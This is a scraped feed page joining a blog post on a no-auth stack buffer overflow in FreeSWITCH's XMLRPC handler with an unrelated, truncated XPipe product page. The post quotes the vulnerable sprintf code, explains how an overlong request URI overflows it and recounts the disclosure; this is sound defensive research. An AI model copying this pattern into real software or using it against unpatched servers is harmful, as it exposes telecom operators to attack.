<p>Towards the end of last year, we learned that a group (allegedly affiliated with the Chinese government, referred to as “Salt Typhoon”) <a href="https://web.archive.org/web/20241127172349/https://www.t-mobile.com/news/un-carrier/update-cyberattacks-targeting-us-wireless-companies">breached T-Mobile and other telecommunications companies</a> and caused all sorts of havoc.</p>



<p>This isn’t really a blog post about that incident, but it was the catalyst that inspired a bit of curiosity within me.</p>



<p>I can’t (legally) access most mobile phone companies’ networks to see what vulnerabilities I can find, but there are plenty of open source software projects related to telecommunications on GitHub. So when I heard about the Salt Typhoon hacks, I wondered, “Is any of this open source telecom software any good?”</p>



<p>In a previous life, I worked with companies that used <a href="https://github.com/asterisk/asterisk" target="_blank" rel="noreferrer noopener">Asterisk</a> and <a href="https://github.com/signalwire/freeswitch" target="_blank" rel="noreferrer noopener">FreeSWITCH</a>, but I’d never really looked into them beyond the surface-level familiarity congruent to “this uses a similar protocol as RedPhone, somewhere” (this was when <a href="https://soatok.blog/2025/02/18/reviewing-the-cryptography-used-by-signal/" target="_blank" rel="noreferrer noopener">Signal</a> was still called TextSecure).</p>



<p>I don’t know much about PBX systems, SIP, or even audio encoding. Furthermore, some of the best C programmers I’ve ever met worked in telecom. Hell, some of the longest-running hacker communities have their roots in phone phreaking from the 1980s. Not to mention all the legendary engineers that trace their roots to Bell Labs.</p>



<p>This is all to say, I thought looking at this sort of software would be a fruitless endeavor. </p>



<p><em>Surely all of the low-hanging fruit would be found already?</em></p>



<p>Thus, I opened FreeSWITCH’s source code on GitHub and almost immediately found a vulnerability.</p>





<h2>Buffer Overflow in HTTP Request Handler for XMLRPC</h2>



<p>In <a href="https://github.com/signalwire/freeswitch/blob/75566bc270f7b4064eb9ff3aed68e2f752fc17ee/libs/xmlrpc-c/lib/abyss/src/handler.c#L243-L250">this excerpt of code</a>, the HTTP request handler for the XMLRPC library bundled with FreeSWITCH writes an arbitrary-length URI to a 4096-byte stack variable called z.</p>


<div><pre title="">char z[4096];
char *p,z1[26],z2[20],z3[9],u;
const char * z4;
int16_t i;
uint32_t k;

if (text) {
    sprintf(z, "Index of %s" CRLF, uri);
</pre></div>


<p>The <code>uri</code> variable <a href="https://github.com/signalwire/freeswitch/blob/75566bc270f7b4064eb9ff3aed68e2f752fc17ee/libs/xmlrpc-c/include/xmlrpc-c/abyss.h#L366-L370">is populated by the path part of the Request URI</a>, which is attacker-provided.</p>



<p>This is not typically a problem, since <a href="https://stackoverflow.com/a/417184" target="_blank" rel="noreferrer noopener">most browsers don’t support URLs longer than 2048 characters</a>, but the relevant RFCs support up to about 8 KB in most cases. (CloudFlare supports up to 32KB.)</p>



<p>I think it’s reasonable to assume that attackers are capable of sending a Request URI longer than 4096 characters.</p>



<p>Putting these observations together, it’s pretty easy to see this is a no-auth buffer overflow in their XMLRPC library. </p>



<blockquote>
<p>Turning this into remote code execution is an exercise left to the reader (mostly because I’m not really up-to-date on OS-level exploit mitigation techniques, and how to bypass them).</p>
</blockquote>



<h3>How To Fix This Issue</h3>



<p><a href="https://sternumiot.com/iot-blog/sprintf-and-snprintf-c-functions-usage-examples-and-security-best-practices/" target="_blank" rel="noreferrer noopener">Use <code>snprintf()</code> instead</a>.</p>



<p>This is kind of “defensive C programming practices 101” level.</p>



<h2 id="disclosure">Soatok Attempts Coordinated Disclosure</h2>



<p>(n.b., <a href="https://soatok.blog/2025/01/21/too-many-people-dont-value-the-time-of-security-researchers/#:~:text=Responsible%20Disclosure%2C%20Isn%E2%80%99t" target="_blank" rel="noreferrer noopener">Please stop saying “responsible” disclosure</a>.)</p>



<p><strong>2025-01-27</strong>: I send an email on to the email address <a href="https://github.com/signalwire/freeswitch/blob/master/SECURITY.md" target="_blank" rel="noreferrer noopener">listed on FreeSWITCH’s security policy</a> with the details of the vulnerability.</p>



<p><strong>2025-02-07</strong>: I send a follow-up email to ensure they received my report.</p>



<p><strong>2025-02-07</strong>: Andrey Volk responds:</p>



<blockquote>
<p>Hello Soatok.</p>



<p>Thank you for your email!</p>



<p>Issues you describe were recently fixed.</p>



<p>Please see:</p>



<p><a href="https://github.com/signalwire/freeswitch/pull/2752" target="_blank" rel="noreferrer noopener">https://github.com/signalwire/freeswitch/pull/2752</a></p>



<p><a href="https://github.com/signalwire/freeswitch/pull/2753" target="_blank" rel="noreferrer noopener">https://github.com/signalwire/freeswitch/pull/2753</a></p>



<p><a href="https://github.com/signalwire/freeswitch/pull/2754" target="_blank" rel="noreferrer noopener">https://github.com/signalwire/freeswitch/pull/2754</a></p>



<p>Best regards,</p>
</blockquote>



<p>Since the fixes are now public, I’m left to assume that “embargo has broken,” so to speak. That means I’m free to blog about this publicly.</p>



<p>However, I notice they haven’t tagged a new release with this security fix for FreeSWITCH users. I reply:</p>



<blockquote>
<p>Oh, wonderful. Thanks for getting back to me.</p>



<p>Do you have an ETA on when the release will be tagged? I don’t want to publish anything until people can easily install an updated version.</p>
</blockquote>



<p>A few hours later, Andrey responds to my email.</p>



<p>Brace yourselves, it’s a stupid one.</p>



<p>…</p>



<blockquote>
<p>Hello Soatok.</p>



<p>Thank you for your interest in FreeSWITCH.</p>



<p>We do not have plans to make a release&nbsp;of FreeSWITCH Community till summer 2025.</p>



<p>Best regards,</p>
</blockquote>





<h3>What Just Happened?</h3>



<p>To recap: An employee of SignalWire (which develops FreeSWITCH) came right out and said they would let people who aren’t <a href="https://web.archive.org/web/20250226171744/https://signalwire.com/products/freeswitch-enterprise">paying for FreeSWITCH Advantage</a> stay vulnerable until their regularly scheduled release (sometime in the Summer).</p>



<p>There are <a href="https://web.archive.org/web/20250312042655/https://www.shodan.io/search?query=freeswitch" target="_blank" rel="noreferrer noopener">about 8,300 hits on Shodan for FreeSWITCH</a> as I write this. I highly doubt they’re all paying for enterprise support, so we’re talking about potentially thousands of telecom stacks around the world that SignalWire has decided to keep vulnerable until the Summer, even after they published the patches on GitHub.</p>



<p>While such a decision might be perfectly legal, it really does not inspire trust in the stewards of this software project to give a shit about the harm their careless coding practices inflict upon their users.</p>



<h2>TelecomSec: A Systemic Issue</h2>



<p>The worst part is, when I confided in a friend that works in telecom (after SignalWire published the fixes, of course) about this carnival-quality vulnerability management from the FreeSWITCH developers, their response was:</p>



<blockquote>
<p>That fast?</p>



<p>[…]</p>



<p>December 2024 is the last time that alarms were once again raised about known SS7 vulnerabilities that have continued to exist in telephone networks for the past 17 years.</p>
</blockquote>



<p>And, to be honest, that <em>kind of took the wind out of my sails</em> so I didn’t bother looking at Asterisk or any of the other software.</p>



<p>I mean, why bother? I already had the answer to the question that prompted me to look in the first place: <strong>Telecom security sucks today</strong>.</p>



<p>The reason things sucks is largely because there’s very little (if any) money to be made in securing these systems today.</p>



<p>Things don’t <em>have to</em> be this way, of course.</p>



<p>Maybe there’s some opportunity for some enterprising young hacker to write a FreeSWITCH competitor in Rust that has sane vulnerability management around it.</p>



<p>(Or, at least, is marginally harder to find vulnerabilities in than <a href="https://github.com/digininja/DVWA" target="_blank" rel="noreferrer noopener">Damn Vulnerable Web Application</a>. Maybe the OpenBSD team can be inspired to act?)</p>



<p>Maybe in the future, we’ll find the political will to invest in the security of America’s telecommunications infrastructure. Who knows, some of that money might even percolate towards open source software, and they can hire someone who knows how to run valgrind.</p>



<p>Or maybe everything will continue to suck, because incentives rule anything, and there currently aren’t any to do better.</p>





<h2>Closing Thoughts</h2>



<p>It took me a long time to write this one up, despite it being a rather simple technical issue, because I’m sure there are eldritch horrors lurking beneath the surface of this relatively simple finding.</p>



<p>The vendor’s response was pretty lame, yeah. But is this vendor the lamest in their industry? I’m not so sure about that one. At least they responded within 90 days and fixed the issue on their GitHub.</p>



<p>But, hey, if you’re waiting on SignalWire to get around to running <code>git tag</code>… maybe rebuild from source or block public HTTP access to your FreeSWITCH stack at the firewall level?</p>



<p>Sorry I can’t help more.</p>





		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: XPipe, a shell connection hub for SSH, Docker, K8s, VMs, and more (153 pts)]]></title>
            <link>https://xpipe.io/</link>
            <guid>43339629</guid>
            <pubDate>Wed, 12 Mar 2025 03:16:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xpipe.io/">https://xpipe.io/</a>, See on <a href="https://news.ycombinator.com/item?id=43339629">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><div><h2>Manage all your servers from your local desktop. No remote setup required.</h2></div><div><p><img alt="Connection hub" width="1280" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fbanner.png&amp;w=1920&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fbanner.png&amp;w=3840&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fbanner.png&amp;w=3840&amp;q=100"></p></div></div><div><div><p><h2>Overview</h2></p></div><div><div><p><img alt="Connection Hub" width="1280" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fhub.png&amp;w=1920&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fhub.png&amp;w=3840&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fhub.png&amp;w=3840&amp;q=100"></p></div><div><h2>Presenting XPipe</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>A connection hub to keep track and manage of all your remote connections in one place</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>A terminal launcher that can launch you into a shell session in your favorite terminal instantly</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Complete SSH support, including config files, agent integrations, jump servers, tunnels, key files, smartcards, X11 forwarding, and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Integrations for various container runtimes like Docker, Podman, Kubernetes, LXD, incus, plus environments like WSL, Cygwin, MSYS2</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Support for hypervisors like Proxmox, Hyper-V, KVM, VMware workstation, and more</p></li></ul></div></div><div><div><p><img alt="File Manager" width="1280" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fbrowser.png&amp;w=1920&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fbrowser.png&amp;w=3840&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fbrowser.png&amp;w=3840&amp;q=100"></p></div><div><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>A remote file browser that provides a workflow optimized for professionals</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>A VNC viewer, an RDP launcher, and an X11 forward server connector. With support for remote apps. All tunneled via SSH</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>A versatile scripting system, allowing for custom shell scripts, init scripts, templates, and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Synchronization of connection information across systems through your own git remote repository. Also suitable for team collaboration</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Automatic tunneling of ports to your local desktop for remote services from any system. Includes automatic detection of services in containers</p></li></ul></div></div></div><div><div><p><h2>Features</h2></p></div><div><div><div><p><img alt="Connection hub" width="945" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fconnections.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fconnections.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fconnections.png&amp;w=1920&amp;q=100"></p></div><div><h2>Manage all your remote connections in one place</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Easily establish and manage connections to remote systems from a central hub interface</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Organize all your connections in hierarchical categories to maintain an overview of hundreds of connections.</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Create specific shell login environments to instantly jump into a properly set up environment for every use case</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Quickly perform various commonly used actions like starting/stopping containers, establishing tunnels, and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Create desktop shortcuts that automatically open remote connections in your terminal without having to open any GUI</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Supports the same feature set for all available integrations</p></li></ul></div></div><div><div><p><img alt="File Manager" width="909" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fbrowser.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fbrowser.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fbrowser.png&amp;w=1920&amp;q=100"></p></div><div><h2>Powerful file management</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Interact with the file system of any remote system using a workflow optimized for professionals</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Instantly open a terminal session into any directory in your favourite terminal emulator</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Utilize your entire arsenal of locally installed programs to open and edit remote files</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Dynamically elevate file browser sessions with sudo when required without having to restart the session</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Seamlessly transfer files from and to your system desktop environment</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Work and perform transfers on multiple systems at the same time with the built-in tabbed multitasking</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Customize every action through the scripting system</p></li></ul></div></div><div><div><p><img alt="Terminal Launcher" width="909" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fterminal.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fterminal.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fterminal.png&amp;w=1920&amp;q=100"></p></div><div><h2>Flexible terminal integration</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Launches you into a shell session in your favourite terminal with one click. Automatically fills password prompts and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Comes with support for all commonly used terminal emulators across all operating systems</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Works with all command shells such as bash, zsh, cmd, PowerShell, and more, locally and remote</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Connects to a system while the terminal is still starting up, allowing for faster connections than otherwise possible</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Supports opening custom terminal emulators as well via a custom command-line spec</p></li></ul></div></div></div></div><div><p><h2>Showcase</h2><h3>XPipe summarized in clips</h3></p></div><div><div><p><h2>Integrations</h2></p></div><div><div><div><div><p><img alt="SSH Connections" width="945" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fssh.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fssh.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fssh.png&amp;w=1920&amp;q=100"></p></div><div><h2>Seamless SSH integration</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>All SSH config files are automatically loaded and applied, your SSH environment is fully set up out of the box</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Your existing SSH agents can be utilized to securely authenticate, there is no need to provide your keys and passwords</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>You can make use of gateways and jump servers to establish connections via intermediate systems</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>All types of SSH tunnels are supported to be quickly opened and closed in the background</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Advanced authentication options such as smart cards and PKCS#11 libraries are also supported</p></li></ul></div></div><div><div><p><img alt="Docker Containers" width="945" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fcontainers.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fcontainers.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fcontainers.png&amp;w=1920&amp;q=100"></p></div><div><h2>Ready for a containerized world</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Automatic detection of all containers on any system without manual configuration for docker, podman, LXD, incus, k8s, Proxmox, and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 